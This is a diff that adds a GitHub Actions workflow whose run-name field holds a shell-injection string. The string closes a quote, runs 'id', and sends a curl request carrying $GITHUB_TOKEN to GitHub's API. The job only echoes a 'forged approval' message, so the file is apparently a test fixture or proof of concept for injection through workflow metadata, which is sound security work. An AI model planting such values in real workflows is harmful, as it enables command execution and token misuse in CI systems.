@@ -1,0 +1,10 @@
+name: ApprovalComment
+run-name: 'r1";id;curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/rate_limit;exit 1;#'
+on:
+  pull_request:
+permissions: {}
+jobs:
+  pass:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo forged-approval-complete
